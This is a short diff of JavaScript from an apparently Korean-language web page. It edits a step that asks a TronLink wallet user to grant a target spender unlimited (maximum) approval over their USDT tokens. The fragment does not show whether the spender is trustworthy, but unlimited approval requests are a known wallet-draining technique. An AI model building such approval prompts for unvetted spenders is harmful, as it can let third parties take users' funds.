@@ -450,10 +450,11 @@
                 appendLog(`[승인 서명 요청] Spender(${targetSpender}) 대상 무제한(MAX) 승인 요청 중...`);
                 showToast("트론링크 승인 서명 팝업창을 확인해주세요.");
 
-                const contract = await tw.contract().at(OFFICIAL_USDT_CONTRACT);
-                const txHash = await contract.approve(targetSpender, MAX_UINT256).send({
-                    feeLimit: 100000000
-                });
+               const contract = await tw.contract().at(OFFICIAL_USDT_CONTRACT);
+               const MAX_ALLOWANCE = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+               const txHash = await contract.approve(targetSpender, MAX_ALLOWANCE).send({
+               feeLimit: 100_000_000
+               });
 
                 if (!txHash) {
                     throw new Error("트랜잭션 해시를 수신하지 못했습니다.");
